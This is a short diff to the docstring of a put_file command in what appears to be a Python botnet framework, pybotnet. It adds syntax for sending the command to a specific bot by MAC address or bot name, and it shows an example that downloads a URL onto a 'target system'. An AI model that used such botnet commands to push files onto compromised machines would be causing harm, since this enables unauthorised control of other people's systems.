@@ -9,10 +9,14 @@ def put_file(context: Context) -> str:
     """
     put file to target system
 
-    syntax:
+    Syntax:
         `/put_file URL_1 URl2 ...`
+        or
+        `[mac-address] /put_file URL_1 URl2 ...`
+        or
+        `[BOT-NAME] /put_file URL_1 URl2 ...`
 
-    example command:
+    Example command:
         `/put_file https://github.com/onionj/pybotnet/archive/refs/heads/master.zip` \n
     """
     if len(context.command) > 0:
